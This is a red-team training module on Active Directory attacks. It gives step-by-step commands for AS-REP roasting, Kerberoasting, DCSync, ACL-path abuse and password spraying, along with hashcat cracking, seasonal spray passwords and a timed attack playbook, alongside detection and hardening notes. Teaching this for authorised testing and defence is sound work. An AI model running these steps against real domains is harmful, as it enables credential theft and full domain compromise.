# Module 18 · Active Directory Attacks

> *"Active Directory was designed in 1999 to make life easy for system administrators. Twenty-five years later, it makes life easy for attackers, too."*

Active Directory is the single largest authentication and authorization system on Earth. Roughly 90% of Fortune 1000 companies, the entire US Department of Defense unclassified network (NIPRNet), almost every hospital, and most state and local government agencies depend on AD to decide *who you are* and *what you can do*. When an attacker compromises a domain controller (DC), they own all of that.

This module teaches you to **enumerate**, **abuse**, and **dominate** Active Directory the way modern adversaries do — using protocol-native attacks (LDAP, Kerberos, SMB) rather than off-the-shelf tools that EDR signatures are tuned to catch.

## The AD attack surface

```
                ┌────────────────────────────┐
                │   Domain Controller (DC)    │
                │  - Kerberos KDC (port 88)   │
                │  - LDAP (389/636)            │
                │  - GC (3268/3269)            │
                │  - SMB (445)                 │
                │  - DNS (53)                  │
                │  - RPC (135 + dynamic)       │
                └─────────┬──────────────────┘
                          │
        ┌─────────────────┼─────────────────┐
        │                 │                 │
   ┌────────┐       ┌─────────┐       ┌──────────┐
   │ User   │       │ Servers  │       │ Service   │
   │ work-  │       │ (file,   │       │ accounts  │
   │ stations│      │  app, DB) │       │ (SPNs)    │
   └────────┘       └─────────┘       └──────────┘
        │                 │                 │
        └─────── group memberships, GPO ────┘
```

Six protocol-native attacks dominate modern AD operations:

| # | Attack | Wire protocol | What you need first |
|---|---|---|---|
| 1 | LDAP enumeration | LDAP / LDAPS | Any domain account (or anonymous on weak DCs) |
| 2 | AS-REP roasting | Kerberos AS-REQ | Username only — no auth required |
| 3 | Kerberoasting | Kerberos TGS-REQ | Any domain account |
| 4 | DCSync | DRSUAPI (RPC over SMB) | Replicating Directory Changes ACL |
| 5 | NTLM relay | SMB/HTTP/LDAP | Position to capture or coerce auth |
| 6 | Pass-the-hash / pass-the-ticket | SMB / Kerberos | NTLM hash or TGT in memory |

Five **paths to domain admin** explain almost every red-team report ever written:

1. **Kerberoast → service account → ACL** — find a service account in `Domain Admins` (or with WriteDACL on a privileged group); crack offline.
2. **AS-REP roast → user with `DONT_REQ_PREAUTH` → crack** — rare but devastating; usually a misconfigured legacy service account.
3. **NTLM coercion → relay to LDAPS** — PetitPotam / PrinterBug / DFSCoerce → relay to LDAPS → grant DCSync.
4. **AD CS misconfig (ESC1-ESC15)** — request a certificate as another user (CVE-2022-26923 et al.).
5. **Trust abuse** — child→parent forest trust, golden ticket forging.

We cover 1, 2, 3, and 4 in detail (5 is in Part 11 Red Team Operations).

## Enumeration: the first 30 minutes

Once you have a domain credential — even a single low-privilege user — your first job is **map the domain**. Modern operators do this with two tools running in parallel: an LDAP collector and a SharpHound-style ACL collector. Both ship in this part:

- `redshift_toolkit.ad.ad_enum` — fast LDAP queries for users, groups, computers, GPOs, OUs, trusts
- `redshift_toolkit.ad.bloodhound_collector` — SharpHound-equivalent JSON output for BloodHound import

```bash
python3 -m redshift_toolkit.ad.ad_enum \
    --dc dc01.lab.local \
    --user alice -p 'Password1' \
    --domain lab.local --all --format json > enum.json

python3 -m redshift_toolkit.ad.bloodhound_collector \
    --dc dc01.lab.local \
    --user alice -p 'Password1' \
    --domain lab.local --output ./bh-data/
```

### What `ad_enum --all` reports

| Field | Why it matters to the attacker |
|---|---|
| `userAccountControl` flags | `DONT_REQ_PREAUTH` → AS-REP roast candidate; `TRUSTED_FOR_DELEGATION` → unconstrained delegation; `PASSWORD_NEVER_EXPIRES` → likely service account |
| `servicePrincipalName` | Kerberoast target |
| `adminCount=1` | Was once in a protected group → likely high-value |
| `pwdLastSet` | Old password (>1 year) likely weak; correlate with password policy |
| `description` field | Frequently contains literal passwords (no joke — search `'pass'` in description across enterprise environments) |
| Group memberships | Domain Admins, Enterprise Admins, Schema Admins, Account Operators, Backup Operators, DnsAdmins (DnsAdmins → DA via DLL load), Print Operators |
| Trust relationships | Cross-forest trusts open lateral paths |

### Quick LDAP queries to run by hand

These are the queries every operator memorizes. The `ad_enum` tool runs them, but you should know what's underneath:

```ldap
# All Kerberoastable accounts
(&(objectClass=user)(servicePrincipalName=*)(!(userAccountControl:1.2.840.113556.1.4.803:=2)))

# All AS-REP roastable accounts
(&(objectCategory=person)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))

# All accounts with unconstrained delegation
(&(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=524288))

# All accounts with constrained delegation
(&(objectCategory=person)(msDS-AllowedToDelegateTo=*))

# All Resource-Based Constrained Delegation targets
(msDS-AllowedToActOnBehalfOfOtherIdentity=*)

# adminCount=1 targets
(&(objectClass=user)(adminCount=1))

# Computers with LAPS managed passwords
(&(objectCategory=computer)(ms-Mcs-AdmPwd=*))
```

The `1.2.840.113556.1.4.803` is the *bitwise-AND* matching rule OID. `=2` is `ACCOUNTDISABLE`, `=4194304` is `DONT_REQ_PREAUTH`, `=524288` is `TRUSTED_FOR_DELEGATION`. Memorize the top eight `userAccountControl` flags — they appear in every AD interview.

## Attack 1: AS-REP Roasting

### How it works

When a Kerberos client requests a TGT (`AS-REQ`), it normally proves identity *first* by encrypting a timestamp with the user's NTLM-derived key. This is **pre-authentication**. If the target account has `DONT_REQ_PREAUTH=true` (UAC bit `0x400000` / `4194304`), the KDC skips that step and ships back an `AS-REP` containing a TGT encrypted with the user's key.

That ciphertext is offline-crackable with `hashcat -m 18200`.

### When you'll see it

- Legacy service accounts created before pre-auth was default (Windows 2000 era).
- Accounts manually configured for backwards compatibility with non-Kerberos clients.
- Pentest environments — almost always a planted finding.

### Wire-level mechanics

```
Client → KDC : AS-REQ
                pa-data: NONE
                req-body: cname = "alice"
                          realm = "LAB.LOCAL"
                          sname = "krbtgt/LAB.LOCAL"

KDC → Client : AS-REP
                ticket = { encrypted with krbtgt key } (we don't care)
                enc-part = { encrypted with alice's NT hash } ← we crack this
```

The `enc-part` is `EncASRepPart` ASN.1 structure encrypted with `etype=23` (RC4-HMAC) when downgraded — RC4 is what hashcat eats. On modern domains AES is default; you'll request RC4 explicitly via `etype` selection.

### Tooling

```bash
# Discover roastable accounts (no auth needed — uses LDAP if creds, otherwise enumerates by username)
python3 -m redshift_toolkit.ad.kerb_brute \
    --dc dc01.lab.local --domain lab.local \
    --userlist /opt/SecLists/Usernames/Names/names.txt \
    --as-rep-roast --output asrep_hashes.txt

# The tool also detects valid usernames silently (KDC returns different errors for valid vs. invalid)
# — KRB5KDC_ERR_PREAUTH_REQUIRED  → user exists, requires preauth
# — KRB5KDC_ERR_C_PRINCIPAL_UNKNOWN → user does not exist
# — encrypted AS-REP returned     → user exists with DONT_REQ_PREAUTH → roastable

# Crack offline:
hashcat -m 18200 asrep_hashes.txt /opt/wordlists/rockyou.txt -r best64.rule
```

### Detection

Defenders watch for:
- Event ID 4768 (TGT requested) with `Pre-Authentication Type: 0` (none)
- High volume from a single IP → mass roasting
- `etype=0x17` (RC4-HMAC) when modern clients should request `0x12` (AES256-CTS)

We mirror these as Sigma rules in Part 13 Module 51.

## Attack 2: Kerberoasting

### How it works

Any authenticated user can request a service ticket (`TGS-REQ`) for any service principal name (SPN). The returned `TGS-REP` contains a ticket encrypted with the **service account's NTLM hash** (or AES key). If the service account has a weak password, you crack offline.

### Why it's catastrophic

- Works against any account with a `servicePrincipalName` set.
- No special privileges required — any domain user can request any TGS.
- AES-encrypted tickets are also crackable (`hashcat -m 19700` for AES256).
- Common service accounts (SQL, IIS, Exchange) often retain their original install-time password set in a runbook ten years ago.

### Tooling

```bash
# Step 1: enumerate SPN-bearing accounts (uses LDAP)
python3 -m redshift_toolkit.ad.ad_enum \
    --dc dc01.lab.local --user alice -p 'Password1' \
    --domain lab.local --filter 'kerberoastable' --format json

# Step 2: request TGS for each SPN, dump hashcat-format hashes
python3 -m redshift_toolkit.ad.kerberoast \
    --dc dc01.lab.local --user alice -p 'Password1' \
    --domain lab.local --output kerb_hashes.txt

# Step 3: crack
hashcat -m 13100 kerb_hashes.txt rockyou.txt -r best64.rule
hashcat -m 19700 kerb_hashes.txt rockyou.txt -r best64.rule  # AES256 variant
```

### Hardening you'll recommend in the report

1. Set service account passwords to ≥25 random characters (effectively uncrackable).
2. Use **gMSA** (group Managed Service Accounts) — auto-rotated 256-bit passwords.
3. Disable RC4 (`HKLM\SYSTEM\CurrentControlSet\Control\Lsa\Kerberos\Parameters\SupportedEncryptionTypes = 0x18`).
4. Audit `userAccountControl` flag `USE_DES_KEY_ONLY` — should be 0 everywhere.

## Attack 3: DCSync

### How it works

The `Replicating Directory Changes` (`DS-Replication-Get-Changes` + `DS-Replication-Get-Changes-All`) extended right lets a principal request replication of an AD partition — **including secrets**, including `krbtgt`'s NTLM hash. Once you have `krbtgt`'s hash you can mint Golden Tickets indefinitely (until krbtgt is rotated *twice*, which takes most environments months).

DCSync uses the `DRSUAPI` RPC interface (`DRSGetNCChanges` opnum 3) over SMB or named pipes. The wire is binary RPC, not LDAP — meaning it bypasses every "weird LDAP query" detection.

### Who has DCSync rights by default

- Domain Admins, Enterprise Admins
- Built-in `Administrators` group
- Domain controllers themselves (RID 516 `Domain Controllers`)

### Who *shouldn't* have DCSync rights but often does

- Azure AD Connect service accounts (sometimes, depending on install)
- Backup software service accounts (Veeam, CommVault) — common misconfiguration
- Help-desk groups with delegated rights gone wrong
- Read-only Domain Controllers (some attribute filters are bypassable)

### Tooling

```bash
# Check if our user has DCSync rights (does NOT actually replicate — read-only ACL check)
python3 -m redshift_toolkit.ad.dcsync_check \
    --dc dc01.lab.local --user alice -p 'Password1' \
    --domain lab.local --check-only

# If yes, simulate a DCSync (extract krbtgt + a target user)
python3 -m redshift_toolkit.ad.dcsync_check \
    --dc dc01.lab.local --user alice -p 'Password1' \
    --domain lab.local --target krbtgt --target administrator
```

For full secretsdump-style replication of every account, use impacket's `secretsdump.py` (much more battle-tested than reimplementing).

### Detection

- Event ID 4662 with `Object Server: DS` + `Properties: Replicating Directory Changes`
- Source IP not in Domain Controllers OU → high-confidence detection

## Attack 4: ACL abuse

Every AD object has a Discretionary ACL (DACL) that grants rights to other principals. Misconfigured DACLs are the **single most common** path to domain admin in modern environments. Common dangerous rights:

| Right | What it lets you do |
|---|---|
| `GenericAll` | Full control — reset password, change SPN (kerberoast), change owner |
| `GenericWrite` | Change writeable attributes including `servicePrincipalName` (forced kerberoast) |
| `WriteDACL` | Re-write the DACL itself → grant yourself any right |
| `WriteOwner` | Take ownership → grant yourself any right |
| `ForceChangePassword` | Reset target's password without knowing the old one |
| `AddMembers` | Add yourself to a group |
| `WriteProperty: Member` | Add yourself to a group via attribute write |
| `AllExtendedRights` | Includes `User-Force-Change-Password` |
| `DCSync rights` (Replicating Directory Changes + All) | DCSync attack |

### Finding attack paths

```bash
# Collect all DACLs
python3 -m redshift_toolkit.ad.acl_analyzer \
    --dc dc01.lab.local --user alice -p 'Password1' \
    --domain lab.local --collect --output dacls.json

# Find shortest path from our user to Domain Admins
python3 -m redshift_toolkit.ad.acl_analyzer \
    --input dacls.json --from "alice" --to "Domain Admins" --shortest-path

# Or feed everything to BloodHound for visualization:
python3 -m redshift_toolkit.ad.bloodhound_collector \
    --dc dc01.lab.local --user alice -p 'Password1' \
    --domain lab.local --output bh-data/
neo4j start
bloodhound  # ← drag bh-data/*.json into the GUI
```

### Industry framing

| Vertical | The DACL story |
|---|---|
| **Healthcare** | EMR service accounts often live in groups with `WriteDACL` on the domain (Epic, Cerner installation defaults). |
| **Financial** | Backup and monitoring service accounts (CommVault, Splunk forwarder service) frequently end up in `Domain Admins` "temporarily" and never get removed. |
| **Defense** | Tier-0 vs. Tier-1 vs. Tier-2 separation is mandated but rarely enforced — workstation admin accounts ending up with rights on DC OUs. |
| **Manufacturing / OT** | OT vendors (Rockwell, Siemens, Honeywell) request service accounts with broad rights on install; never reviewed. |

## Attack 5: Password spraying

Locking out a domain by brute-forcing one account 1000 times is loud and useless. **Password spraying** flips the model: try one common password against *every* account.

```bash
# 1. First, learn the lockout policy (or the operation will burn the engagement)
python3 -m redshift_toolkit.ad.password_spray \
    --dc dc01.lab.local --read-policy

# Output:
#   Lockout threshold: 5 attempts
#   Lockout window:    30 minutes
#   Reset window:      30 minutes

# 2. Spray with safe defaults (1 attempt per user per 35 minutes — under threshold)
python3 -m redshift_toolkit.ad.password_spray \
    --dc dc01.lab.local --domain lab.local \
    --userlist users.txt --password 'Welcome2026!' \
    --interval 2100 --jitter 60
```

Common spray passwords (rotated by season):
- `<CompanyName><year>!`
- `Welcome<year>` / `Welcome<year>!` 
- `Password<MonthNumber>!`
- `Spring2026!` / `Summer2026!`

The tool can pull a password policy from **already-recovered** OSINT (Part 3 LinkedIn scraping) — many companies post hiring docs that disclose password complexity.

### Detection

- Event ID 4625 (failed logon) clustering across many usernames, single source IP
- Splunk SPL: `EventCode=4625 | bucket _time span=1h | stats dc(Account_Name) by src_ip,_time | where dc>20`

## The 30-minute AD attack playbook

Once you have *any* domain credential:

```
00:00  Run ad_enum.py --all → confirm domain reachable, count users/groups
00:05  Run kerb_brute.py --as-rep-roast → opportunistic free hash
00:10  Run kerberoast.py → all SPN tickets to disk
00:15  Hand kerberoast hashes to hashcat (start cracking, parallel)
00:20  Run bloodhound_collector → ACL graph data
00:25  Open BloodHound → mark our user as Owned → "Shortest Path to DA"
00:30  Decide path:
         a) Direct ACL path (rare but instant)
         b) Crack a kerberoast hash (medium; depends on dictionary)
         c) Coerce + relay (PetitPotam → ntlmrelayx) [Part 7]
         d) AD CS abuse (ESC1-ESC15) [Part 7]
```

If everything fails, fall back to **password spraying** (slow but reliable) and **looking for plain-text creds in SYSVOL** (`\\dc01\sysvol\lab.local\policies\` — search for `cpassword`).

## Industry-specific framings

### Healthcare

- HHS OCR settlements regularly cite "lateral movement on AD network" as the breach mechanism. Conti hit Universal Health Services in 2020; Children's Health of Orange County in 2024; the playbook is identical: phish → AD enum → Kerberoast → DA → ransomware.
- HIPAA technical safeguard 164.312(a)(1) requires "unique user identification" — translates to *no shared service accounts*, but every hospital has them.

### Financial

- PCI DSS Requirement 8.3 (multi-factor for non-console admin) and 7.2 (least-privilege) — both directly map to your DA-path findings.
- Banking trojans (Carbanak, FIN6) historically used Kerberoast on SQL service accounts to pivot to core banking systems.

### Government / Defense

- The 2020 NSA "Detecting Abuse of Authentication Mechanisms" advisory specifically calls out Kerberos, NTLM relay, and federation token forging as nation-state-relevant TTPs.
- The DoD's Risk Management Framework (RMF) categorizes any AD compromise as a CAT I finding (mission-stopping). 
- For TS/SCI interviews: be ready to walk through SolarWinds → AAD Connect compromise → token signing key theft → AD FS golden SAML.

## Lab exercises

1. **GOAD lab — AS-REP roast.** Stand up GOAD, identify the user with `DONT_REQ_PREAUTH` set, roast and crack.
2. **GOAD lab — Kerberoast chain.** Find a kerberoastable account, crack it, log in, find ACL path to DA.
3. **GOAD lab — DCSync.** Use the cracked DA account to DCSync `krbtgt`, then mint a Golden Ticket.
4. **HTB Forest.** AS-REP roast → DCSync via Account Operators ACL.
5. **HTB Sauna.** AS-REP roast → DCSync via DA ACL.
6. **HTB Active.** SYSVOL `cpassword` → Kerberoast → DCSync.

## Next steps

We have domain credentials and (if we cracked one) a service account. We need to **move**: pivot through the network, execute remotely, exfiltrate data. That's [Module 19 — Network Pivoting & Lateral Movement](19-pivoting-lateral.md).
